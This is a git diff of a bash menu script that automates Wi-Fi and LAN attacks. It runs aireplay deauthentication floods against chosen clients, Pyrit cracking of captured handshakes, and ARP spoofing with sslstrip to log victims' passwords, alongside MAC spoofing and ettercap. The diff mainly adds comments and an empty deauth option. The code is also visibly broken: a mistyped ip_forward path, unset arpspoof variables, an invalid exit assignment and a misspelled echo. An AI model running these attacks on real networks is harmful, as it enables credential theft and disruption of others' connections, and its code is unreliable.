@@ -2,6 +2,7 @@
 clear
 exit=0
 
+##Main loop
 while [ exit != 2 ]; do
 	#Functions and variables
 	polo(){
@@ -10,7 +11,7 @@ while [ exit != 2 ]; do
 	
 	CURRENT_TARGET=""
 	CURRENT_TARGET2=""
-	
+	#Function to determine CIDR and then scan using nmap providing selection options
 	auto_map(){
 		echo "Please wait. Scanning..."
 		n=0
@@ -21,7 +22,7 @@ while [ exit != 2 ]; do
 			targetIPs[$(( count+1 ))]=" "
 			count=$(( $count + 2 ))
 		done
-		
+		#3>&2 2&1 1>&3- is needed to make the whiptail UI appear.
 		CURRENT_TARGET=$( whiptail --menu "Select a target host:" 20 80 10 \
 			"${targetIPs[@]}" 3>&2 2>&1 1>&3- )
 		CURRENT_TARGET2=$( whiptail --menu "Select a target client:" 20 80 10 \
@@ -41,14 +42,18 @@ while [ exit != 2 ]; do
 		pyrit "Pyrit (for caps)" \
 		sslstrip "SSLStrip" \
 		ettercap "Open ettercap GUI" 2>CHOICE \
+		deauth "Deauth attack - sends deauth packets to target"\
 		quit "Quit"
 	
-	
+	#Wait. doesnt whiptail have the case system built-in?
 	CHOICE=$(cat CHOICE)
 	
 	
 	case $CHOICE in
 	
+	#turns off interfaces.
+	#Sets interfaces to random Macaddr
+	#brings interfaces back up
 	macchange) ifconfig eth0 down
 		ifconfig wlan0 down
 		macchanger -r eth0
@@ -56,25 +61,29 @@ while [ exit != 2 ]; do
 		ifconfig eth0 up
 		ifconfig wlan0 up
 	;;
-	
+	#Starts monitor mode using wlan0 interface
+	#starts running airodump
 	airodump) airmon-ng start wlan0
 		airodump-ng mon0
 	;;
 	
+	##Airodump a specific AP must make skider
 	airodump2) whiptail --inputbox "Please enter access point bssid:" 25 50 2>AIRODUMPBSSID 
 		AIRODUMPBSSID=$(cat AIRODUMPBSSID)
 		airodump-ng --bssid $AIRODUMPBSSID mon0
 	;;
-	
+	#takes host and client.
 	aireplay) whiptail --inputbox "Please enter host bssid:" 25 50 2>AIREPLAYHOST
 		whiptail --inputbox "Please enter a client ("null" if no client):" 25 50 2>AIREPLAYCLIENT
 		AIREPLAYHOST=$(cat AIREPLAYHOST)
 		AIREPLAYCLIENT=$(cat AIREPLAYCLIENT)
-	
+		
+		#Launches airodump in an xterm window and then waits for it to start up
 		xterm -e airodump-ng --bssid $AIREPLAYHOST -w Caps/BigProgram mon0 &
 		echo "Waiting for airodump to start..."
 		sleep 5s
 		
+		#starts deauth if AIREPLAY client is set using the vars inputed
 		if [ $AIREPLAYCLIENT != "null" ]; then
 			aireplay-ng --deauth 100 -a $AIREPLAYHOST -c $AIREPLAYCLIENT --ignore-negative-one mon0
 		else
@@ -82,24 +91,30 @@ while [ exit != 2 ]; do
 		fi
 	;;
 	
+	#lel cracking passwords on a raspberry pi will be difficult
+	#Starts a cracker, Pyrit, on a cap file using a specified wordlist
 	pyrit) whiptail --inputbox "Please enter a cap file to crack:" 25 50 2>PYRITCAP
 		whiptail --inputbox "Please enter a wordlist:" 25 50 2>PYRITWORDLIST
 		
 		PYRITCAP=$(cat PYRITCAP)
 		PYRITWORDLIST=$(cat PYRITWORDLIST)
-	
+
 		pyrit -r $PYRITCAP -i $PYRITWORDLIST attack_passthrough
 	;;
-	
+	#My favorite -Jack
 	sslstrip)
 		auto_map
-	
-		echo 1 > /proc/sys/net/ipv4/ip_forward
+		
+		#Enables ip-forwarding
+		echo 1 > /proc/sys/net/ipv4/ip_forwardreding
+		#opens up NAT and redirects trafiic from port 80 to port 8080 within the machine
 		iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
-	
+		
+		#launches arpspoof impersonating the host and the client
 		xterm -e arpspoof -i wlan0 -t $ARPSPOOFHOST $ARPSPOOFCLIENT &
 		xterm -e arpspoof -i wlan0 -t $ARPSPOOFCLIENT $ARPSPOOFHOST &
-
+		
+		#launches sslstrip Passwords will be displayed on screen and logged in sslstrip.log (may wish to add some kind of time stamping in the name... Oh well)
 		sslstrip -k -l 8080 -w /root/Desktop/sslstrip.log 
 	
 		echo "Press enter to terminate..."
@@ -107,12 +122,16 @@ while [ exit != 2 ]; do
 		killall arpspoof
 	;;
 	
+	#Cha thats cheating! no GUI 4 you!
 	ettercap) ettercap -G
 	;;
-	
+	#Will be my favorite if it will work! gah!
+	deauth)
+	;;
+	#exits the loop of eternity
 	quit) exit = 1
 	;;
-	
+	#Major error *Saluts*
 	*) ehco "MAJOR ERROR, PLEASE RESTART"
 	;;
 	
